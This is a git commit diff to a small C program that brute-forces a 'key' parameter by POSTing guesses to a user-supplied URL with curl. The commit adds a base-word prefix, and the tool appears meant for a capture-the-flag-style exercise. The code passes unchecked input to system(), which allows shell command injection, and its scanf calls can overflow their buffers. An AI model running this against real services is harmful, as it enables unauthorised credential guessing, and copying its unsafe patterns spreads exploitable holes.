96e8d59c07885be8e18e2c5668f0082f87ac231c
Abdullah Mashia <999mashia@gmail.com>
2026-05-29 15:02:29 +0300

    Update c_script_post_url_bruteforce.c
    add the feature of setting up the base word for the key

--- c_script_post_url_bruteforce.c
+++ c_script_post_url_bruteforce.c
@@ -8,15 +8,19 @@ FILE* result = popen("results.txt","wr");
 
 
 char url[150];
+char base_word[10];
 
 char command_buffer[300];
-printf("=====> input the url");
+printf("=====> input the url:");
+printf("=====> enter the base word:");
+scanf("%s",base_word);
+        
 scanf("%s",url);
 
 for (int c=33; c<140 ; c++)
 {
 
-        snprintf(command_buffer, sizeof(command_buffer) , "curl -X POST  %s  -d \"key=KEY%c\" | grep mono >> results.txt",url,c);
+        snprintf(command_buffer, sizeof(command_buffer) , "curl -X POST  %s  -d \"key=%s%c\" | grep mono >> results.txt",url,base_word,c);
         system("echo  \"=====>\">> results.txt");
         int status = system(command_buffer);
         
